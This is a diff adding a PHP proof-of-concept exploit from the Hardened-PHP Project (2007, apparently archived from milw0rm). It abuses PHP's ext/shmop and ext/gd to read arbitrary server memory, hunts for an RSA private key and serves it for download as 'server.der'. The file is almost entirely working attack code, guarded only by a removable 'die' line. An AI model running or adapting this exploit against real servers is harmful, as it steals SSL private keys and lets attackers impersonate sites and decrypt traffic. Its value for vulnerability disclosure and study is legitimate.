@@ -1,0 +1,68 @@
+<?php
+  ////////////////////////////////////////////////////////////////////////
+  //  _  _                _                     _       ___  _  _  ___  //
+  // | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \ //
+  // | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/ //
+  // |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|   //
+  //                                                                    //
+  //         Proof of concept code from the Hardened-PHP Project        //
+  //                   (C) Copyright 2007 Stefan Esser                  //
+  //                                                                    //
+  ////////////////////////////////////////////////////////////////////////
+  //        PHP ext/shmop SSL RSA Private-Key Disclosure Exploit        //
+  ////////////////////////////////////////////////////////////////////////
+
+  // This is meant as a protection against remote file inclusion.
+  die("REMOVE THIS LINE");
+
+  if (!extension_loaded("gd") || !extension_loaded("shmop")) {
+    die("This demonstration exploit only works with ext/gd and ext/shmop loaded.");
+  }
+
+  function init()
+  {
+    global $rid;
+    
+    $rid = imagecreate(10,10);
+    imagecolorallocate($rid, 0, 0, 0);
+    imagecolorallocate($rid, 0, 0, 0);
+  }
+  
+  function peek($addr, $size)
+  {
+    global $rid;
+    imagecolordeallocate($rid, 0);
+    imagecolordeallocate($rid, 1);
+    imagecolorallocate($rid, $addr, 0, 0);
+    imagecolorallocate($rid, $size, 0, 0);
+    return shmop_read((int)$rid, 0, $size);
+  }
+
+  init();
+  
+  $offset = 0x08048000 + 1024 * 64;
+  
+  while (1) {
+  
+    $data = peek($offset, 1024 + 16);
+    
+    $position = strpos($data, "\x30\x82");
+    if ($position !== false && $position < 1024) {
+      // Potential Key
+      if (substr($data, $position+4, 4) == "\x02\x01\x00\x02") {
+        $length = ord($data[$position+2])*256+ord($data[$position+3])+4;
+        $keydata = peek($offset + $position, $length);
+        // Assume an exponent of 0x10001 to really find a RSA key and not a DSA one
+        if (strpos($keydata, "\x01\x00\x01") > 0)
+            break;
+      }
+    }
+    $offset += 1024;
+  }
+
+  header("Content-type: application/octet-stream");
+  header("Content-Disposition: attachment; filename=\"server.der\"");  
+  echo $keydata;
+?>
+
+# milw0rm.com [2007-03-07]
